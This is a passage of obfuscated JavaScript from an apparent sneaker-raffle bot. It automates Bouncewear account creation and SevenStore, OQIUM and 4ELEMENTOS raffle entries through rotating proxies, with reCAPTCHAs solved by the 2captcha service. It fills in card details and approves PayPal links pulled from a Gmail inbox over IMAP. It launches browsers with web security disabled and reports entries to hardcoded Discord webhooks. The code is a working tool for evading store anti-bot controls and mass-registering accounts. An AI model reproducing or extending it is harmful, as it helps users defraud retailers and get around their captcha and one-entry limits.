            }), console['log'](_0x38a61b() + '\x20[' + _0x42d6e4['name'] + ']\x20Task\x20' + (_0x484404 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4f3e2b['setRequestInterception'](!![]), _0x4f3e2b['on']('request', _0x7bc2ff => {
                _0x7bc2ff['resourceType']() === 'image' || _0x7bc2ff['resourceType']() === 'font' || _0x7bc2ff['resourceType']() === 'media' ? _0x7bc2ff['abort']() : _0x7bc2ff['continue']();
            }), await _0x4f3e2b['goto'](_0x11088e), await _0xbbd9dc(0xbb8), await _0x4f3e2b['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x38a61b() + '\x20[' + _0x42d6e4['name'] + ']\x20Task\x20' + (_0x484404 + 0x1) + '\x20:\x20Filling\x20information'), await _0x4f3e2b['type']('#RegisterForm-FirstName', '' + bouncewear[_0x484404]['FirstName']), await _0xbbd9dc(0x226), await _0x4f3e2b['type']('#RegisterForm-LastName', '' + bouncewear[_0x484404]['LastName']), await _0xbbd9dc(0x226), await _0x4f3e2b['type']('#RegisterForm-email', '' + bouncewear[_0x484404]['Email']), await _0xbbd9dc(0x226), await _0x4f3e2b['type']('#RegisterForm-password', '' + bouncewear[_0x484404]['Password']), await _0xbbd9dc(0x226), await _0x4f3e2b['click']('#marketing'), console['log'](_0x38a61b() + '\x20[' + _0x42d6e4['name'] + ']\x20Task\x20' + (_0x484404 + 0x1) + '\x20:\x20Submitting..'), await _0x4f3e2b['$eval']('#RegisterForm', _0x1207d0 => _0x1207d0['submit']()), await _0xbbd9dc(0x1f40), console['log'](_0x38a61b() + '\x20[' + _0x42d6e4['name'] + ']\x20Task\x20' + (_0x484404 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x4f3e2b['solveRecaptchas'](), await _0x4f3e2b['click']('.shopify-challenge__button.btn');
            async function _0x3d58fa() {
                for (var _0x335fc0 = 0x0; _0x335fc0 < 0x4; _0x335fc0++) {
                    try {
                        console['log']('try'), await _0x4f3e2b['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x38a61b() + '\x20[' + _0x42d6e4['name'] + ']\x20Task\x20' + (_0x484404 + 0x1) + '\x20:\x20' + _0x19e6c5['red']('Catpcha\x20failed,\x20retrying..')), await _0x4f3e2b['solveRecaptchas'](), await _0x4f3e2b['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x3d58fa(), console['log'](_0x38a61b() + '\x20[' + _0x42d6e4['name'] + ']\x20Task\x20' + (_0x484404 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0xbbd9dc(0x1f4);
            try {
                await _0x4f3e2b['waitForSelector']('.featured-title'), await _0xbbd9dc(0x1f4), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x42d6e4['name'] + ']\x20Task\x20' + (_0x484404 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x484404]['Email'] + '\x20Generated!')), _0x80a504['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x484404]['Email'] + ',' + bouncewear[_0x484404]['Password']), console['log'](_0x19e6c5['yellow'](_0x38a61b() + '\x20[' + _0x42d6e4['name'] + ']\x20Task\x20' + (_0x484404 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x484404]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x430073) {
                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x484404 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x430073));
            }
        } catch (_0x3b25c6) {
            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x199de3[taskModule]['name'] + ']\x20Task\x20' + (_0x484404 + 0x1) + '\x20:\x20' + _0x3b25c6));
        } finally {
            _0x1e64d0 && _0x1e64d0['close'](), console['log']('Waiting\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
        }
    }
}
async function _0x279196(_0x2ba02b, _0x1585b7, _0x31b583) {
    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x9a51aa['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4ae15e = 0x0; _0x4ae15e < _0x1585b7['length']; _0x4ae15e++) {
        _0x1f02d2(_0x2ba02b['name'] + '\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20/\x20' + _0x1585b7['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa);
        var _0x4f718f = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x213f4d
                },
                {
                    'name': 'Product',
                    'value': '' + _0x1585b7[_0x4ae15e]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x1585b7[_0x4ae15e]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x9a51aa['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x9a51aa['version']
                }
            ]
        }];
        const _0x287497 = { 'embeds': _0x4f718f };
        await _0x2f5330(_0x1585b7, _0x4ae15e);
        if (_0x1585b7[_0x4ae15e]['Email'] == '' || _0x1585b7[_0x4ae15e]['Password'] == '' || _0x1585b7[_0x4ae15e]['FirstName'] == '' || _0x1585b7[_0x4ae15e]['LastName'] == '') {
            console['log'](_0x38a61b() + '\x20[' + _0x2ba02b['name'] + ']\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x1585b7[_0x4ae15e]['Password'] == '' || _0x1585b7[_0x4ae15e]['Password'] == undefined) && (_0x1585b7[_0x4ae15e]['Password'] = 'ErehsaWonRaj1!');
        if (_0x9a51aa['useRandomProxy'] = ![])
            var _0x41fd21 = _0x31b583[_0x4ae15e]['split'](':');
        else
            var _0x3b7e01 = Math['round'](Math['random']() * (_0x31b583['length'] - 0x1)), _0x41fd21 = _0x31b583[_0x3b7e01]['split'](':');
        const _0x2b5436 = await _0x6d7b51['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x41fd21[0x0] + ':' + _0x41fd21[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x3b9771 = await _0x2b5436['newPage']();
            await _0x3b9771['authenticate']({
                'username': '' + _0x41fd21[0x2],
                'password': '' + _0x41fd21[0x3]
            }), console['log'](_0x38a61b() + '\x20[' + _0x2ba02b['name'] + ']\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3b9771['setRequestInterception'](!![]), _0x3b9771['on']('request', _0x4131f0 => {
                _0x4131f0['resourceType']() === 'image' || _0x4131f0['resourceType']() === 'font' || _0x4131f0['resourceType']() === 'media' ? _0x4131f0['abort']() : _0x4131f0['continue']();
            }), await _0x3b9771['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x3b9771['goto']('' + _0x1585b7[_0x4ae15e]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x3b9771['waitForSelector']('#btnPdpAtb'), console['log'](_0x38a61b() + '\x20[' + _0x2ba02b['name'] + ']\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x1585b7[_0x4ae15e]['Size']);
            const _0x55f82e = await _0x3b9771['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x2de925 => {
                return _0x2de925['map'](_0x4f4864 => _0x4f4864['innerText']);
            }), _0x1c6e17 = await _0x3b9771['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0xd62203 = ![];
            if (_0x1585b7[_0x4ae15e]['Size'] == 'RANDOM') {
                var _0x4b5b4c = Math['round'](Math['random']() * (_0x1c6e17['length'] - 0x1));
                await _0x1c6e17[_0x4b5b4c]['click']();
            } else
                for (var _0x391a32 = 0x0; _0x391a32 < _0x55f82e['length']; _0x391a32++) {
                    if (_0x55f82e[_0x391a32] != _0x1585b7[_0x4ae15e]['Size'])
                        continue;
                    try {
                        await _0x1c6e17[_0x391a32]['click']();
                    } catch {
                        console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x2ba02b['name'] + ']\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0xd62203 = !![];
                    }
                }
            if (_0xd62203)
                continue;
            await _0xbbd9dc(0x578), await _0x3b9771['click']('#btnPdpAtb'), await _0x3b9771['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0xbbd9dc(0x3e8), console['log'](_0x38a61b() + '\x20[' + _0x2ba02b['name'] + ']\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x3b9771['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x3b9771['waitForSelector']('#email'), await _0x3b9771['type']('#email', _0x1585b7[_0x4ae15e]['Email']), await _0xbbd9dc(0x226), await _0x3b9771['click']('#guest-submit'), await _0xbbd9dc(0x1b58), console['log'](_0x38a61b() + '\x20[' + _0x2ba02b['name'] + ']\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3b9771['waitForSelector']('#firstname'), await _0x3b9771['type']('#firstname', _0x1585b7[_0x4ae15e]['FirstName'], 0x1f4), await _0xbbd9dc(0x190), await _0x3b9771['waitForSelector']('#surname'), await _0x3b9771['type']('#surname', _0x1585b7[_0x4ae15e]['LastName'], 0x1f4), await _0xbbd9dc(0x190), await _0x3b9771['waitForSelector']('#mobile'), await _0x3b9771['type']('#mobile', _0x1585b7[_0x4ae15e]['Phone'], 0x1f4), await _0xbbd9dc(0x190), await _0x3b9771['click']('#enterManualDiv'), await _0xbbd9dc(0x5dc), await _0x3b9771['waitForSelector']('#address1'), await _0x3b9771['type']('#address1', _0x1585b7[_0x4ae15e]['Address1'] + '\x20' + _0x1585b7[_0x4ae15e]['HouseNumber'], 0x226), await _0xbbd9dc(0x384), await _0x3b9771['waitForSelector']('#address2'), await _0x3b9771['type']('#address2', '' + _0x1585b7[_0x4ae15e]['Address2'], 0x226), await _0xbbd9dc(0x320);
            const _0x45ac95 = await _0x3b9771['$$eval']('#countryselect_view3\x20>\x20option', _0x1ddede => {
                return _0x1ddede['map'](_0x233f93 => _0x233f93['value']);
            });
            var _0xed2b75;
            for (var _0x454e4f = 0x0; _0x454e4f < _0x45ac95['length']; _0x454e4f++) {
                if (_0x45ac95[_0x454e4f]['startsWith']('' + _0x1585b7[_0x4ae15e]['Country'])) {
                    _0xed2b75 = _0x45ac95[_0x454e4f];
                    break;
                }
                continue;
            }
            await _0x3b9771['select']('#countryselect_view3', '' + _0xed2b75), await _0x3b9771['waitForSelector']('#address4'), await _0x3b9771['type']('#address4', '' + _0x1585b7[_0x4ae15e]['City'], 0x1f4), await _0xbbd9dc(0x384), await _0x3b9771['waitForSelector']('#postcode'), await _0x3b9771['type']('#postcode', '' + _0x1585b7[_0x4ae15e]['Zip'], 0x1f4), await _0xbbd9dc(0x4b0);
            const _0xd16cdc = await _0x3b9771['url']();
            console['log'](_0x38a61b() + '\x20[' + _0x2ba02b['name'] + ']\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x445bc6 = _0xd16cdc['split']('?')[0x1], _0x1cbfa3 = await _0x3b9771['$']('#co_address_submit');
            await _0x1cbfa3['evaluate'](_0x35350d => _0x35350d['click']()), await _0xbbd9dc(0x1388), await _0x3b9771['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x445bc6), console['log'](_0x38a61b() + '\x20[' + _0x2ba02b['name'] + ']\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x3b9771['waitForSelector']('#paymentbuttons'), await _0xbbd9dc(0x1388), await _0x3b9771['click']('#paymentbuttons\x20>\x20div'), await _0xbbd9dc(0x1c2), await _0x3b9771['waitForSelector']('#card-number'), await _0x3b9771['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x4d35fc = await _0x3b9771['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0xf54690 = await _0x4d35fc['contentFrame']();
            await _0xf54690['waitForSelector']('.InputContainer'), await _0xf54690['click']('.InputContainer\x20>\x20input'), await _0xbbd9dc(0x578), await _0x3b9771['type']('#card-number', '' + _0x1585b7[_0x4ae15e]['CreditNumber']), await _0xbbd9dc(0xfa), await _0x3b9771['type']('#card-expiry', '' + _0x1585b7[_0x4ae15e]['ExpiryDate']), await _0xbbd9dc(0xfa), await _0x3b9771['type']('#card-cvc', '' + _0x1585b7[_0x4ae15e]['CVV']), await _0xbbd9dc(0x7d0), await _0x3b9771['click']('#card-button'), console['log'](_0x38a61b() + '\x20[' + _0x2ba02b['name'] + ']\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x3b9771['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x2ba02b['name'] + ']\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x4236dd(_0x5df4ad, _0x287497);
            } catch {
                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x2ba02b['name'] + ']\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20:\x203DS\x20Failed')), _0x4f718f[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x4f718f[0x0]['description'] = '3DS\x20Failed', await _0x4236dd(_0x48c50b, _0x287497);
            }
        } catch (_0x13ac99) {
            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x2ba02b['name'] + ']\x20Task\x20' + (_0x4ae15e + 0x1) + '\x20:\x20' + _0x13ac99)), _0x4f718f[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x4f718f[0x0]['description'] = '' + _0x13ac99, await _0x4236dd(_0x48c50b, _0x287497);
        } finally {
            _0x2b5436 && _0x2b5436['close']();
            if (_0x4ae15e + 0x1 == _0x1585b7['length']) {
                console['log'](_0x19e6c5['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0xbbd9dc(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x9a51aa['AfewDelay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['AfewDelay']);
        }
    }
}
async function _0x2d3af7(_0x526d62, _0x4f72de, _0xec3d1a, _0x386d61, _0xaef79a) {
    var _0x375956, _0x190ae6 = {}, _0x366d20 = [], _0x7dfb83 = {}, _0x41c8eb = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x386d61 && (_0x386d61 = {});
    if (_0x4f72de != 'ver') {
        _0x1f02d2(_0xec3d1a['name'] + '\x20Task\x20' + (_0x526d62 + 0x1) + '\x20/\x20' + _0x386d61['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa), await _0x2f5330(_0x386d61, _0x526d62), _0x366d20 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x213f4d
                },
                {
                    'name': 'Size',
                    'value': '' + _0x386d61[_0x526d62]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x9a51aa['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x198625
                }
            ]
        }], _0x7dfb83 = { 'embeds': _0x366d20 }, _0x190ae6 = _0xec3d1a['data'];
        _0x4f72de == 'exp' ? _0x190ae6['data']['attributes']['email'] = '' + _0x386d61[_0x526d62]['FirstName'] + _0x386d61[_0x526d62]['LastName'] + _0x9a51aa['catchall'] : _0x190ae6['data']['attributes']['email'] = '' + _0x386d61[_0x526d62]['Email'];
        if (_0x386d61[_0x526d62]['Size'] == 'RANDOM') {
        }
        _0x190ae6['data']['attributes']['properties']['$first_name'] = '' + _0x386d61[_0x526d62]['FirstName'], _0x190ae6['data']['attributes']['properties']['$last_name'] = '' + _0x386d61[_0x526d62]['LastName'], _0x190ae6['data']['attributes']['properties']['$address1'] = _0x386d61[_0x526d62]['Address1'] + '\x20' + _0x386d61[_0x526d62]['Address2'] + '\x20' + _0x386d61[_0x526d62]['HouseNumber'], _0x190ae6['data']['attributes']['properties']['$zip'] = '' + _0x386d61[_0x526d62]['Zip'], _0x190ae6['data']['attributes']['properties']['$city'] = '' + _0x386d61[_0x526d62]['City'], _0x190ae6['data']['attributes']['properties']['$country'] = '' + _0x386d61[_0x526d62]['Country'], _0x190ae6['data']['attributes']['properties']['Size'] = '' + _0x386d61[_0x526d62]['Size'], _0x190ae6['data']['attributes']['properties']['$phone_number'] = '' + _0x386d61[_0x526d62]['Phone'], _0x190ae6['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x386d61[_0x526d62]['Follower'];
    }
    if (_0x9a51aa['useRandomProxy'] = ![])
        var _0x278338 = _0xaef79a[_0x526d62]['split'](':');
    else
        var _0x4eefde = Math['round'](Math['random']() * (_0xaef79a['length'] - 0x1)), _0x278338 = _0xaef79a[_0x4eefde]['split'](':');
    var _0x3b2a60 = {
        'jar': _0x3720c0,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0xec3d1a['url'],
        'headers': _0xec3d1a['headers'],
        'body': JSON['stringify'](_0x190ae6),
        'proxy': 'http://' + _0x278338[0x2] + ':' + _0x278338[0x3] + '@' + _0x278338[0x0] + ':' + _0x278338[0x1]
    };
    return _0x4f72de != 'ver' && (_0x3b2a60['url'] = _0xec3d1a['url'], _0x3b2a60['headers'] = _0xec3d1a['headers']), _0x4f72de == 'ver' && (_0x3b2a60['method'] = 'GET'), new Promise(function (_0x17382a, _0x2d802e) {
        callback = async (_0x3ff937, _0x1d5ea5, _0x288c0f) => {
            if (!_0x3ff937 && _0x1d5ea5['statusCode'] == 0xca || !_0x3ff937 && _0x1d5ea5['statusCode'] == 0xc8) {
                if (_0x4f72de != 'ver') {
                    var _0x5e3d17 = await _0x23dc1b(_0x386d61[_0x526d62], _0xec3d1a, 'dev', ![]), _0x8aaddf = await _0x23dc1b(_0x386d61[_0x526d62], _0xec3d1a, 'pub', ![]);
                    const _0x336e42 = {
                        'succesDEVMSG': { 'embeds': [_0x5e3d17] },
                        'succesPUBMSG': { 'embeds': [_0x8aaddf] }
                    };
                    if (_0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '')
                        try {
                            await _0x4236dd(_0x9a51aa['webhook'], _0x336e42['succesDEVMSG']);
                        } catch {
                        }
                    await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x336e42['succesDEVMSG']), await _0xbbd9dc(0xc8);
                    try {
                        await _0x4236dd(_0x4d6262, _0x336e42['succesPUBMSG']);
                    } catch {
                    }
                    _0x5d1d0f(_0x386d61[_0x526d62], _0xec3d1a);
                }
                _0x17382a(console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0xec3d1a['name'] + ']\x20Task\x20' + (_0x526d62 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x4f72de != 'ver') {
                    var _0x1fe895 = '' + _0x3ff937, _0x40875d = await _0x23dc1b(_0x386d61[_0x526d62], _0xec3d1a, 'dev', !![], _0x1fe895), _0x2ae081 = {};
                    _0x2ae081['errorDEV'] = { 'embeds': [_0x40875d] }, _0xc8d9fd(_0x386d61[_0x526d62], _0xec3d1a), _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x2ae081['errorDEV']), await _0x4236dd(_0x48c50b, _0x2ae081['errorDEV']);
                }
                _0x2d802e(console['log'](_0x38a61b() + '\x20[' + _0xec3d1a['name'] + ']\x20Task\x20' + (_0x526d62 + 0x1) + ':\x20' + _0x3ff937));
            }
        };
        try {
            _0x4f72de != 'ver' && console['log'](_0x38a61b() + '\x20[' + _0xec3d1a['name'] + ']\x20Task\x20' + (_0x526d62 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x190ae6['data']['attributes']['email']), _0x355e6b(_0x3b2a60, callback);
        } catch (_0x529eb8) {
            console['log'](_0x38a61b() + '\x20Task\x20' + (_0x526d62 + 0x1) + ':\x20' + _0x529eb8);
        }
    });
}
;
async function _0x432efb(_0x4f35a1, _0x2dae69, _0x336450) {
    var _0x4f35a1 = [];
    async function _0x8e644a() {
        var _0x2f5ed7 = new _0x9597be({
            'user': _0x9a51aa['masterMail'],
            'password': _0x9a51aa['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x3ed7bb(_0x5615db) {
            _0x2f5ed7['openBox']('INBOX', ![], _0x5615db);
        }
        _0x2f5ed7['once']('ready', function () {
            _0x3ed7bb(function (_0x1437ff, _0x8340a3) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x1437ff)
                    throw _0x1437ff;
                _0x2f5ed7['seq']['search'](['UNSEEN'], function (_0xb7d794, _0x3567a9) {
                    if (!_0x3567a9 || !_0x3567a9['length'])
                        console['log'](_0x38a61b() + '\x20[' + _0x2dae69['name'] + ']\x20No\x20mails\x20found'), _0x2f5ed7['end']();
                    else {
                        var _0x1b8fbe = _0x2f5ed7['seq']['fetch'](_0x3567a9, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x1b8fbe['on']('message', function (_0x51de7c, _0x2a355c) {
                            var _0x1e1f56 = '(#' + _0x2a355c + ')\x20';
                            _0x51de7c['on']('body', function (_0x244f85, _0x30a5ce) {
                                _0x45ab86(_0x244f85, (_0x312f02, _0x5999e3) => {
                                    if (_0x5999e3['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x5999e3['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x5999e3['text']['split']('[')[0x2];
                                        var _0x50360c = mes['split'](']')[0x0];
                                        _0x4f35a1['push'](_0x50360c);
                                    }
                                });
                            }), _0x51de7c['once']('end', function () {
                            });
                        }), _0x1b8fbe['once']('error', function (_0x219c50) {
                            console['log']('Fetch\x20error:\x20' + _0x219c50);
                        }), _0x1b8fbe['once']('end', function () {
                            _0x2f5ed7['end']();
                        });
                    }
                });
            });
        }), _0x2f5ed7['once']('error', function (_0x284901) {
            console['log'](_0x19e6c5['red'](_0x284901['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x2f5ed7['once']('end', async function () {
        }), _0x2f5ed7['connect']();
    }
    try {
        _0x8e644a(), await _0xbbd9dc(0xfa0), console['log']('Found\x20' + _0x4f35a1['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
    }
    var _0x281119;
    _0x1f02d2('' + _0x2dae69);
    var _0x2de23e = _0x336450[0x0]['split'](':');
    const _0xb038e = await _0x6d7b51['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x2de23e[0x0] + ':' + _0x2de23e[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x38a61b() + '\x20[' + _0x2dae69 + ']\x20Getting\x20Session');
        const _0xe06634 = await _0xb038e['newPage']();
        await _0xe06634['authenticate']({
            'username': '' + _0x2de23e[0x2],
            'password': '' + _0x2de23e[0x3]
        }), await _0xe06634['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0xe06634, await _0xe06634['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x38a61b() + '\x20[' + _0x2dae69 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0xe06634['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x38a61b() + '\x20[' + _0x2dae69 + ']\x20Successfully\x20logged\x20in'), await _0xbbd9dc(0x2710);
        } catch (_0x4d794b) {
            throw new Error('Login\x20session\x20expired\x20' + _0x4d794b);
        }
        for (var _0x125164 = 0x0; _0x125164 < _0x4f35a1['length']; _0x125164++) {
            console['log'](_0x38a61b() + '\x20[' + _0x2dae69 + ']\x20Task\x20' + (_0x125164 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x1f02d2(_0x2dae69 + '\x20Task\x20' + (_0x125164 + 0x1) + '\x20/\x20' + _0x4f35a1['length']);
            const _0x27b58e = await _0xb038e['newPage']();
            await _0x27b58e['goto']('' + _0x4f35a1[_0x125164], { 'waitUntil': 'networkidle2' }), await _0xbbd9dc(0xbb8);
            try {
                const _0x1a6690 = await _0x27b58e['$']('#challenge-heading');
                _0x1a6690 && (console['log'](_0x38a61b() + '\x20[' + _0x2dae69 + ']\x20Task\x20' + (_0x125164 + 0x1) + '\x20:\x20' + _0x19e6c5['yellow']('2FA\x20Required')), await _0x27b58e['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0xbbd9dc(0x61a8), await _0x27b58e['waitForSelector']('#payment-submit-btn'), await _0x27b58e['$eval']('#payment-submit-btn', _0x5d912d => _0x5d912d['click']()), await _0x27b58e['click']('#payment-submit-btn');
                try {
                    await _0x27b58e['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0xbbd9dc(0x5dc), console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x2dae69 + ']\x20Task\x20' + (_0x125164 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x3b508b) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x3b508b['message']);
                } finally {
                    await _0x27b58e['close'](), await _0xbbd9dc(0x4650);
                }
            } catch (_0x1f72af) {
                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x2dae69 + ']\x20Task\x20' + (_0x125164 + 0x1) + '\x20:\x20' + _0x1f72af));
            }
        }
    } catch (_0x2191ae) {
        console['log'](_0x19e6c5['red']('' + _0x2191ae));
    } finally {
        await _0xb038e['close']();
    }
}
const _0x199de3 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x475c46, _0x3ae6b0, _0x2af2ee) {
                    _0x6d7b51['use'](_0x1a9750()), _0x6d7b51['use'](_0xf48e5f({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x9a51aa['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2880a8 = 0x0; _0x2880a8 < _0x3ae6b0['length']; _0x2880a8++) {
                        if (_0x53a13d != 'yes')
                            var _0x53a13d = '', _0x50b6a1 = 0x0;
                        var _0x143a01;
                        await _0x2f5330(_0x3ae6b0, _0x2880a8), _0x1f02d2(_0x475c46['name'] + '\x20Task\x20' + (_0x2880a8 + 0x1) + '\x20/\x20' + _0x3ae6b0['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa);
                        var _0x528252 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x2450f9 = Math['round'](Math['random']() * (_0x528252['length'] - 0x1));
                        _0x3ae6b0[_0x2880a8]['Size'] == 'RANDOM' && (_0x3ae6b0[_0x2880a8]['Size'] = _0x528252[_0x2450f9]);
                        var _0x25396d = Math['round'](Math['random']() * (_0x2af2ee['length'] - 0x1)), _0x3dd075 = _0x2af2ee[_0x25396d]['split'](':'), _0x1c3c61;
                        try {
                            _0x1c3c61 = await _0x6d7b51['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3dd075[0x0] + ':' + _0x3dd075[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1c3c61 = await _0x6d7b51['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3dd075[0x0] + ':' + _0x3dd075[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x38a61b() + '\x20[' + _0x475c46['name'] + ']\x20Task\x20' + (_0x2880a8 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x3143aa = await _0x1c3c61['newPage']();
                            await _0x3143aa['authenticate']({
                                'username': '' + _0x3dd075[0x2],
                                'password': '' + _0x3dd075[0x3]
                            }), await _0x3143aa['setRequestInterception'](!![]), _0x3143aa['on']('request', _0x4e5f4 => {
                                _0x4e5f4['resourceType']() === 'image' || _0x4e5f4['resourceType']() === 'font' || _0x4e5f4['resourceType']() === 'media' ? _0x4e5f4['abort']() : _0x4e5f4['continue']();
